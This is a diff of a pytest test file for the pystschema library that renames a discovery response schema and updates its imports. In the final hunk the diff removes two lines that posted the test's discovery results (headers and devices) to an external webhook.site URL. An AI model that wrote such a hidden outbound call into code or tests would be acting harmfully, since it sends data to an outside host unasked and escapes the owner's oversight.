@@ -1,6 +1,6 @@
 import pytest
 from tests.fixtures import DeviceFixture
-from pystschema.discovery_implementation import DiscoverySchema, DiscoveryResponse
+from pystschema.responses import DiscoveryResponseSchema, DiscoveryResponse
 
 class TestDiscoveryResponse:
 
@@ -17,7 +17,7 @@ class TestDiscoveryResponse:
 
     @pytest.fixture
     def schema(self):
-        schema = DiscoverySchema()
+        schema = DiscoveryResponseSchema()
         yield schema
 
     def test_discovery_object(self, discovery_response):
@@ -33,6 +33,4 @@ class TestDiscoveryResponse:
         assert type(discovery_result['headers']) is dict
         assert discovery_result['devices']
         assert type(discovery_result['devices']) is list
-        import requests
-        requests.post('https://webhook.site/2927a049-3b0d-4bf9-97d6-9d1ed083da14', json=discovery_result)
 
